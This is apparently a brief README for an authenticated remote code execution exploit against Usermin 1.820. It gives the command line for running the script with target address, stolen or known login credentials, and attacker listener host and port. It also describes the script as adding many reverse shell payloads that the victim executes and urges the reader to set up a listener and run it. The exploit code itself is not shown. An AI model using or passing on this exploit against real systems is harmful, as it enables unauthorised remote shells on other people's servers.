Usermin 1.820 Exploit - RCE Authenticated

```
Need login page credentials to run the exploit.

python3 userminRCE.py -u TARGETip -l USER -p PASSWORD -lh LHOSTip -lp LPORT
```
This is a improved version of "twitter.com/numanturle" exploit, improved aspects are lhost and lport flags and a lot of reverse shell payloads that the victim executes, set up your listener and run!
